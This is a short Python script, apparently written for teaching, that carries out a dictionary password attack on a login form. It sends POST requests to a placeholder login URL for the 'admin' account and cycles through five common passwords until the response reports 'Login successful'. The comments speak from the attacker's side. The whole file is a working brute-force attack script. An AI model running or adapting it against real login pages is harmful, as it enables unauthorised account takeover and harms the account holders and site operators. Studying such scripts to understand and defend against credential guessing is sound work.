# Import the requests library
# This library allows Python to send HTTP requests to websites
import requests


# The target login page the attacker wants to attack
target = "http://example.com/login"


# The username the attacker is trying to compromise
# Attackers usually target privileged accounts first
username = "admin"


# A list of passwords to try
# This represents a dictionary of common passwords
password_list = [
    "password",
    "admin123",
    "letmein",
    "123456",
    "qwerty"
]


# Loop through every password in the password list
for password in password_list:

    # Send a POST request to the login page
    # POST is used because login forms send credentials this way
    response = requests.post(target, data={
        "username": username,
        "password": password
    })

    # Check if the response from the website indicates success
    # Many scripts look for specific success messages
    if "Login successful" in response.text:

        # If the login worked, print the discovered password
        print("Password found:", password)

        # Stop trying passwords once the correct one is found
        break

    else:
        # If the login failed, print the failed password attempt
        print("Failed:", password)